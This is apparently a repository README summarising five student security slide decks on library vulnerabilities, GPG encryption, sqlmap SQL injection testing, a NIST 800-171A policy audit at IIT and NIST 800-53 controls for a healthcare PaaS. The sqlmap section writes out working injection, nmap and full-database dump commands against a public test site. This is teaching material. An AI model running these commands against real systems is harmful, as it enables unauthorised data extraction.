# _Implementing-NIST-SP-800-53-Rev.-5-Security-and-Privacy-Controls-in-a-Cloud-Computing-Environment-
# Presentation Repository

## Overview
This repository contains five PowerPoint presentations covering various aspects of application, data, cloud, and policy security. Each slide deck is intended for developers, security professionals, IT students, and administrators to gain practical knowledge on identifying and mitigating common vulnerabilities, implementing encryption, performing penetration testing, and aligning institutional and cloud policies with NIST controls.

---

## Contents
- **Presentation Files**
  1. `Software Code & Threat Analysis.pptx`  
     Explores tools, vulnerable libraries, CVEs, and mitigation strategies.
  2. `Secure Data Storage and Encryption using GnuPG.pptx`  
     Demonstrates how to set up MySQL securely and implement GPG encryption for data protection.
  3. `SQL Injection Testing using SQLmap.pptx`  
     Provides a walkthrough of using sqlmap to discover and exploit SQL injection flaws in a target web application.
  4. `IIT’s Cybersecurity Policies for Compliance with NIST SP 800-171A.pptx`  
     Evaluates Illinois Institute of Technology’s cybersecurity policies against NIST SP 800-171A controls and provides findings and recommendations. :contentReference[oaicite:0]{index=0}
  5. `Implementing NIST SP 800-53 Rev. 5 Security and Privacy Controls in a Cloud Computing Environment.pptx`  
     Illustrates how to apply selected NIST SP 800-53 Rev. 5 controls (for access, auditing, configuration, and vulnerability management, etc.) within a healthcare-focused PaaS scenario. :contentReference[oaicite:1]{index=1}

- **README.md**  
  This file, which explains the purpose, structure, and usage instructions for the repository.

---

## Slide Deck Breakdowns

### 1. Software Code & Threat Analysis
1. **Title Slide**  
   - “Software Code & Threat Analysis Presentation” – Objectives and scope.  
2. **Flawfinder**  
   - Overview of Flawfinder for scanning C/C++ source code against CWE listings.  
3. **ImageMagick v7.1.0-27**  
   - History (October 2021 release) and associated security risks when processing untrusted images.  
4. **Detail/Discover Software Threats**  
   - Guidance on identifying weaknesses in software dependencies and image-processing libraries.  
5. **CVE-2022-28463 Mitigation**  
   - Explanation of the ImageMagick-related vulnerability and recommended patch/workaround steps.  
6. **FFmpeg v4.4.3**  
   - Overview (released August 26 2021), typical use cases, and multimedia processing vulnerabilities.  
7. **Threat Discovery for FFmpeg**  
   - Spotting unsafe library usage, untrusted codecs, and malicious media streams.  
8. **FFmpeg Mitigations**  
   - Best practices: updating to a secure FFmpeg version, sandboxing, and safe configuration.  
9. **OWASP Dependency-Check**  
   - Introduction to OWASP Dependency-Check as a software composition analysis (SCA) tool for various runtimes (Java, .NET, Ruby, Python, Node.js).  
10. **Apache Struts v2.2.3.1**  
    - Historical context (released 2011), common exploit vectors, and notable security incidents.  
11. **Threat Discovery in Struts**  
    - Auditing Struts-based applications, identifying outdated components, and risk assessment.  
12. **Struts Mitigations**  
    - Upgrading to a secure Struts version, applying vendor patches, and using runtime protections (e.g., WAF rules).  
13. **OpenSSL v1.0.1**  
    - Overview (released 2012), significant vulnerabilities (e.g., Heartbleed), and cryptography-related risks.  
14. **Threat Discovery in OpenSSL**  
    - Identifying insecure API usage, weak cipher configurations, and out-of-date libraries.  
15. **OpenSSL Mitigations**  
    - Best practices: updating OpenSSL, enforcing strong cipher suites, and performing regular cryptographic audits.  

---

### 2. Secure Data Storage and Encryption using GnuPG
1. **Title Slide & Group Credits**  
   - “Secure Data Storage and Encryption using GnuPG”  
   - Contributors: Bhargava Reddy Kikkura, Bharath Kumar Uppala, Hari Kiran Gaddam, Bharath Viswa Teja, Vidya Charan Maddala, Rajabinandhan Periyagoundanoor Gopal.  
2. **Introduction to Database & MySQL**  
   - Definition of a database.  
   - Overview of MySQL as an open-source RDBMS (speed, reliability, ease of use).  
3. **Logging into MySQL & Creating a Database**  
   - Steps to log in as `root`.  
   - SQL commands to create a new database.  
4. **Creating Tables in the Database**  
   - SQL statements for defining tables (columns, data types, primary keys).  
5. **Inserting Data**  
   - `INSERT` commands demonstrating how to populate tables with sample records.  
6. **Creating a User for the Database**  
   - SQL commands to create a dedicated MySQL user and grant appropriate privileges.  
7. **GPG Encryption Keys Overview**  
   - Importance of GPG for private digital communication: public/private key pairs, digital signatures, encrypted email, and secure file sharing.  
8. **Setting up GPG**  
   - Installation and configuration steps.  
   - Choosing key type and key size, entering user metadata, and creating a strong passphrase.  
9. **Exporting Keys to ASCII Files**  
   - Command to export the public key in ASCII-armored format:  
     ```bash
     gpg --export --armor > public_key.asc
     ```  
   - Command to list and export the secret (private) key securely.  
10. **Encryption & Decryption Implementation**  
    - Role of encryption: protecting database backups, files, and preventing unauthorized access.  
    - Role of decryption: allowing only authorized users (with correct private key/passphrase) to read protected data.  
    - Example commands:  
      ```bash
      # Encrypt a file for a recipient
      gpg --encrypt --recipient <recipient-email> <file-to-encrypt>

      # Decrypt an encrypted file
      gpg --decrypt <encrypted-file>
      ```
11. **Use Cases & Best Practices**  
    - Encrypting MySQL backups before archiving or transferring off-site.  
    - Secure file-sharing workflows:  
      - Generating a new keypair per user.  
      - Keeping private keys offline.  
      - Rotating keys periodically.  

---

### 3. SQL Injection Testing using SQLmap
1. **Title Slide & Course Context**  
   - “SQL Injection Testing using SQLmap”  
   - Database Security (ITMS-528-01), Illinois Institute of Technology, Department of Information Technology and Management.  
   - Contributors: Bhargava Reddy Kikkura, Bharath Kumar Uppala, Hari Kiran Gaddam, Bharath Viswa Teja, Vidya Charan Maddala, Rajabinandhan Periyagoundanoor Gopal. :contentReference[oaicite:2]{index=2}  
2. **Scouting the Target Website**  
   - Identifying a live, vulnerable endpoint:  
     ```
     http://testphp.vulnweb.com/listproducts.php?cat=1
     ```  
   - Testing URL parameter injection:  
     ```
     http://testphp.vulnweb.com/listproducts.php?cat='
     ```
3. **Using Nmap on the Target**  
   - Running Nmap to enumerate open ports or services (e.g., HTTP, database ports) before running sqlmap.  
   - Command example:  
     ```bash
     nmap -sV testphp.vulnweb.com
     ```
4. **Enumerating Databases with sqlmap**  
   - Basic command to fetch database names:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
     ```  
   - Example result:  
     ```
     acuart  
     information_schema
     ```
5. **Extracting Table Names**  
   - Using `-D` to specify the database and `--tables` to list all tables:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
     ```  
   - Example tables in `acuart`:  
     ```
     Artists  
     Carts  
     Categ  
     Featured  
     Guestbook  
     Pictures  
     products  
     users
     ```
6. **Dumping All Table Data**  
   - Using `-a` (all) to fetch all data from every table automatically:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables -a
     ```
7. **Filtering Specific Information**  
   - Targeting `information_schema` tables to list system metadata:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D information_schema --tables
     ```
   - Finding specific columns in a system table, e.g., `ADMINISTRABLE_ROLE_AUTHORIZATIONS`:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       -D information_schema -T ADMINISTRABLE_ROLE_AUTHORIZATIONS -columns
     ```
8. **Best Practices & Mitigations**  
   - Demonstrates how to identify injection points, enumerate databases, tables, and columns, and extract sensitive data.  
   - Emphasizes the importance of parameterized queries, ORM protections, input validation, and proper error handling to prevent SQL injection.  

---

### 4. IIT’s Cybersecurity Policies for Compliance with NIST SP 800-171A
1. **Title Slide & Team Credits**  
   - “IIT’s Cybersecurity Policies for Compliance with NIST SP 800-171A”  
   - Contributors: Isis Navarro, Joshua Davenport, Trent Kauflin, Raj Gopal, Hui Fang. :contentReference[oaicite:3]{index=3}  
2. **Project Overview**  
   - **Purpose**: Evaluating IIT’s cybersecurity policies for compliance with NIST SP 800-171A, ensuring CMMC readiness for DoD contracts and grants.  
   - **Audited Policies**:  
     - Acceptable Use of OTS Resources  
     - Use of Technology Resources  
     - Non-Interference with Technology Infrastructure  
     - Remediation Policy  
     - Security Training Plan  
3. **Methodology**  
   - Defined scope across NIST SP 800-171A control families, including Access Controls, Awareness and Training, Audit and Accountability, Configuration Management, Identification and Authentication, Incident Response, Maintenance, Media Protection, Personnel Security, Physical Protection, Risk Assessment, Security Assessment, System and Communications Protection, and System and Information Integrity. Excluded Planning, Systems and Services Acquisition, and Supply Chain Risk Management as not applicable.  
   - Followed a checklist per document using specific source assessment procedures and mapped findings to NIST requirements.  
   - Investigated shortcomings and provided recommendations and concluding observations. :contentReference[oaicite:4]{index=4}  
4. **Acceptable Use of OTS Resources**  
   - **Findings**:  
     - Missing explicit mention of MFA and secure communication protocols (NIST AC-17, SC-12).  
     - Annual cybersecurity training exists, but lacks role-specific CUI modules (NIST AT-2).  
     - AI usage limits CUI sharing with unsanctioned tools but no secure transmission guidance (NIST SC-12).  
     - Logging and monitoring do not specify retention, protection, or tamper detection (NIST AU-2, AU-6).  
     - Incident sanctions are defined, but long-term incident response details are absent (NIST IR-4). :contentReference[oaicite:5]{index=5}  
   - **Recommendations**:  
     - Implement MFA for CUI systems (NIST AC-17).  
     - Enforce encrypted communication (VPNs, TLS/SSL) for CUI (NIST SC-12).  
     - Tailor cybersecurity training with role-specific CUI modules (NIST AT-3).  
     - Define logging retention, encryption, and access controls (NIST AU-2, AU-6).  
     - Establish AI-safe data protocols with encryption requirements (NIST SC-12).  
     - Strengthen incident response process details (NIST IR-3). :contentReference[oaicite:6]{index=6}  
5. **Use of Technology Resources**  
   - **Findings**:  
     - MFA not explicitly required (NIST AC-17).  
     - Encryption standards for password storage unclear (NIST MP-05).  
     - No secure password transmission procedures specified.  
     - VoIP policy lacks encryption requirements (NIST SC-12, SC-13).  
     - Logging retention and protection details are missing (NIST AU-2, AU-6). :contentReference[oaicite:7]{index=7}  
   - **Recommendations**:  
     - Mandate MFA across all user access (NIST AC-17).  
     - Clarify and enforce encryption protocols for password storage (NIST MP-05).  
     - Define secure password transmission methods (e.g., encrypted channels).  
     - Require encrypted VoIP communications (NIST SC-12, SC-13).  
     - Enhance logging standards: retention, encryption, and access restrictions (NIST AU-2, AU-6). :contentReference[oaicite:8]{index=8}  
6. **Non-Interference with Technology Infrastructure**  
   - **Findings**:  
     - No encryption for radio communications (NIST SC-12).  
     - Lacks documented configuration management process (NIST CM-02, CM-03).  
     - Missing incident handling and corrective action tracking (NIST IR-04, IR-05).  
     - No training or awareness for non-interference controls (NIST AT-02, AT-03).  
     - Monitoring for policy violations not addressed (NIST RA-05). :contentReference[oaicite:9]{index=9}  
   - **Recommendations**:  
     - Incorporate encryption for RF communications (NIST SC-12).  
     - Define and document configuration management workflows (NIST CM-02, CM-03).  
     - Establish a formal incident response plan with corrective action tracking (NIST IR-04, IR-05).  
     - Implement awareness and training programs for infrastructure policies (NIST AT-02, AT-03).  
     - Deploy monitoring tools for detecting policy violations (NIST RA-05). :contentReference[oaicite:10]{index=10}  
7. **Remediation Policy**  
   - **Findings**:  
     - Data-at-rest encryption standard not specified (e.g., AES-256) or mention of FIPS 140-2 modules.  
     - No logging mechanism for remediation actions, compromising non-repudiation.  
     - Separation of privileges between normal and privileged users not defined.  
     - Lack of assurance that remediation occurs in an isolated secure environment. :contentReference[oaicite:11]{index=11}  
   - **Recommendations**:  
     - Mandate AES-256 (or equivalent) for all static and transmitted data during remediation.  
     - Enforce TLS/SSL for all remediation communications.  
     - Use tamper-proof logging to ensure traceability and non-repudiation.  
     - Define privilege separation for remediation tasks and require isolated environment execution. :contentReference[oaicite:12]{index=12}  
8. **Security Training Plan**  
   - **Findings**:  
     - Policy specifies rule acknowledgment but doesn’t detail rule review frequency (NIST PL-04).  
     - Onboarding training review/update schedule not explicit (NIST AT-02).  
     - Recurring training defined, but completion tracking frequency and ownership unclear (NIST AU-06).  
     - Role-based training not outlined (NIST AT-03).  
     - No feedback loop for phishing awareness improvement (NIST AT-02). :contentReference[oaicite:13]{index=13}  
   - **Recommendations**:  
     - Establish a formal schedule for policy rule reviews and updates (NIST PL-04).  
     - Explicitly state onboarding training review/update intervals (NIST AT-02).  
     - Define training completion tracking processes, frequency, and responsible parties (NIST AU-06).  
     - Document role-specific training requirements (NIST AT-03).  
     - Implement a feedback loop for phishing training based on simulated tests and survey results (NIST AT-02). :contentReference[oaicite:14]{index=14}  
9. **Conclusions**  
   - **Core Areas for Improvement**:  
     - **Multi-Factor Authentication**: Strengthen access controls for systems handling Controlled Unclassified Information (CUI).  
     - **Password Encryption**: Define encryption protocols for password storage and transmission.  
     - **Secure Communication**: Enforce encryption for all CUI in transit and at rest.  
     - **Role-Based Training**: Tailor training content to specific CUI roles to improve awareness and compliance.  
     - **Incident Response**: Establish a clear, documented process for reporting, isolating, and remediating security incidents.  
   - **Impact of Recommendations**:  
     - Enhances overall security posture.  
     - Improves protection of CUI.  
     - Ensures alignment with NIST SP 800-171A controls and CMMC readiness.  
     - Fosters a culture of continuous improvement and risk mitigation. :contentReference[oaicite:15]{index=15}  

---

### 5. Implementing NIST SP 800-53 Rev. 5 Security and Privacy Controls in a Cloud Computing Environment
1. **Title Slide & Team Credits**  
   - “Implementing NIST SP 800-53 Rev. 5 Security and Privacy Controls in a Cloud Computing Environment”  
   - Contributors: Bhargava Reddy Kikkuru, Rajabinandhan Periyagoundanoor Gopal, Kshiragna Challagundla (A20526074), Surendar Venkatachalam. :contentReference[oaicite:16]{index=16}  
2. **Business Scenario**  
   - A small healthcare business uses Platform as a Service (PaaS) to meet its application development and data storage needs. The business specializes in handling patient records and offering telemedicine services.  
   - Example software: OpenEMR, OfficeAlly, OpenClinic GA.  
3. **Selected Security & Privacy Controls**  
   - **AC-2(8) Dynamic Account Management**  
     - Test taken by logging in as Administrator, then creating a ‘Front Desk’ role user (User1).  
   - **AC-9 Previous Logon Access Notification**  
     - Implementation includes setting up an Email/SMS notification module to display last logon date/time upon successful user login.  
     - Configuration steps for SMTP (Mailgun, Google Workspace, Gmail) and cron jobs (e.g., `/var/www/html/openemr/modules/sms_email_reminder/cron_email_notification.php`).  
   - **CA-2(2) Specialized Assessments**  
     - High-impact system assessment steps: defining scope, identifying high-impact assets, penetration testing, architecture review, secure code review, documentation, and remediation.  
     - Tools: Burp Suite, Nessus (penetration testing); SonarQube, Veracode (secure code review).  
   - **RA-5 Vulnerability Monitoring & Scanning**  
     - Regular vulnerability scans on OpenEMR: define scope, set scanner parameters, authenticate, integrate with change management, document results, prioritize fixes, and automate retesting.  
     - Tools: Nessus, Qualys, Tenable.io, Tenable.sc, OpenVAS.  
   - **AC-6(10) Prohibit Non-privileged Users from Executing Privileged Functions**  
     - Verify that a Front Desk user (User1) cannot access Administrator-level functions.  
   - **AU-2 Event Logging**  
     - Confirm that the application logs all events, including unsuccessful login attempts.  
   - **CM-10 Software Usage Restrictions**  
     - Verify that OpenEMR enforces acknowledgement of licensing and certification information before software usage.  
   - **PL-4 Rules of Behavior**  
     - Ensure that OpenEMR displays rules of behavior (responsibilities and expected user conduct) and collects user acknowledgments via a link (e.g., OpenEMR wiki [Access Controls Listing](https://www.open-emr.org/wiki/index.php/Access_Controls_Listing)).  
4. **OfficeAlly & OpenClinic GA Overview**  
   - **OfficeAlly** (SaaS bundle: Service Center, Practice Mate, EHR 24/7)  
     - Account Management: Administrator (cannot create users), Security Administrator (create/manage accounts), Child (least privilege).  
     - Access Enforcement: Role-based privileges, read/write controls, public/privileged/confidential data classification, retention policies (7 years), export formats.  
   - **OpenClinic GA** (Open-source HIS covering admin, financial, clinical, lab, pharmacy, meals, etc.)  
     - Three main packages: Service Center, Practice Mate, EHR 24/7.  
     - User interface and customizable features to meet diverse healthcare requirements.  
5. **Additional Controls**  
   - **AC-11 Session Lock**  
     - Automatically locks user sessions after inactivity; requires reauthentication to unlock.  
   - **AC-12 Session Termination**  
     - Automatically terminates idle sessions; forces user reauthentication.  
   - **IA-5(1) Authenticator Management (Password-Based Authentication)**  
     - Enforce password expiration at defined intervals to prompt periodic changes.  
   - **CM-14 Signed Components**  
     - Prevent installation of software/firmware unless signed by an approved certificate authority.  
6. **Conclusions & Recommendations**  
   - Emphasize ongoing monitoring, periodic reassessments, patch management, and documentation to maintain a secure PaaS environment.  
   - Align PaaS configurations with NIST SP 800-53 Rev. 5 controls to ensure confidentiality, integrity, and availability of patient data. :contentReference[oaicite:17]{index=17}  

---

## How to View the Slide Decks
1. **Clone or Download**  
   ```bash
   git clone https://github.com/<your-username>/<repository-name>.git
   cd <repository-name>
